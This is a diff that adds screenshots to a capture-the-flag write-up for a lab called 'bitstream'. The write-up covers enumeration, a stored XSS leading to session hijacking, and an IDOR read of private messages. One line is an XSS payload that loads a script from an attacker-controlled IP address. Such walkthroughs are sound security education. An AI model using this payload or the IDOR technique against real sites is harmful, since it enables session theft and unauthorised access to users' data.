@@ -99,6 +99,14 @@ Key findings:
 - **`/portal`** — An authenticated employee dashboard that redirects to `/login` when unauthenticated. This is the target post-exploitation endpoint.
 - **`/login`** — Employee login page. No credentials available at this stage; authentication bypass via session hijacking is the target path.
 
+<div style="text-align: center;">
+  <img src="/assets/images/ctf/bitstream/feroxbuster.png" alt="Feroxbuster results" style="max-width: 100%;" />
+</div>
+
+<div style="text-align: center;">
+  <img src="/assets/images/ctf/bitstream/login-page.png" alt="Login page" style="max-width: 100%;" />
+</div>
+
 ---
 
 # Phase 2 — Stored XSS to Session Hijacking
@@ -108,6 +116,10 @@ Key findings:
 The `/quote` form accepts a **Company Name** field that is rendered unsanitized inside the employee portal when staff review incoming quote requests. This is a classic **stored (persistent) XSS** vulnerability: attacker-controlled input is saved to the database and executed in the context of any employee who views the quotes page.
 
 The first step was to confirm the vulnerability by injecting a script tag that loads a remote JavaScript file, causing the victim's browser to make an outbound HTTP request to the attacker's server:
+
+<div style="text-align: center;">
+  <img src="/assets/images/ctf/bitstream/xss-injection.png" alt="XSS payload in quote form" style="max-width: 100%;" />
+</div>
 
 ```
 "><script src=http://192.168.211.2:443/script.js></script>
@@ -200,6 +212,10 @@ Authenticated as `joey@bitstream.hsm`, the employee portal exposes three section
 ## Insecure Direct Object Reference (IDOR)
 
 The message IDs visible in joey's inbox are not contiguous — gaps exist in the sequence. This suggests messages between other users exist server-side but are simply not linked from joey's inbox. If the server performs no ownership validation — checking only that the user is authenticated, not that the message belongs to them — then any authenticated user can read any message by iterating IDs.
+
+<div style="text-align: center;">
+  <img src="/assets/images/ctf/bitstream/idor-message-list.png" alt="Message list with sequential IDs" style="max-width: 100%;" />
+</div>
 
 Iterating all message IDs from 1 to 27 while authenticated as joey confirmed the absence of access controls. Message 27, a private conversation between `tommy@bitstream.hsm` and `jon@bitstream.hsm`, was fully readable:
 
